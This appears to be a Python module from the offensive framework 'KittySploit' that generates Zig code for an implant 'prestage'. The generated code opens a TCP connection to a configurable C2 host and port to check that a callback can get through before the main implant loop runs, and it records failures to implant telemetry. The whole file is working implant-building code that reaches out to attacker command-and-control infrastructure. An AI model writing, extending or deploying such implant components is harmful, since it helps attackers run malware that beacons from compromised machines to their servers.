#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from typing import Any, Dict

from kittysploit import *


class Module(Prestage):
    PRESTAGE_ID = "network_preflight"

    __info__ = {
        "name": "Network Preflight (Zig)",
        "description": "Probe callback reachability before entering the main implant loop",
        "author": "KittySploit Team",
        "version": "1.0.0",
        "platform": Platform.MULTI,
        "languages": ["zig"],
        "prestage_dependencies": ["telemetry_buffer"],
        "tags": ["prestage", "offline", "network", "zig"],
    }

    def generate_zig(self, context: Dict[str, Any] = None) -> str:
        ctx = dict(context or {})
        c2_host = str(ctx.get("c2_host") or "").replace("\\", "\\\\").replace('"', '\\"')
        c2_port = int(ctx.get("c2_port") or 8088)
        if not c2_host:
            return "// network_preflight: set lhost on payload"
        return f"""
    const addr = std.net.Address.parseIp4("{c2_host}", {c2_port}) catch {{
        kittyTelemetryRecord("network_preflight", "parse_failed", "{c2_host}");
        return;
    }};
    const stream = std.net.tcpConnectToAddress(addr) catch |err| {{
        kittyTelemetryRecord("network_preflight", "failed", @errorName(err));
        return;
    }};
    stream.close();
""".strip()
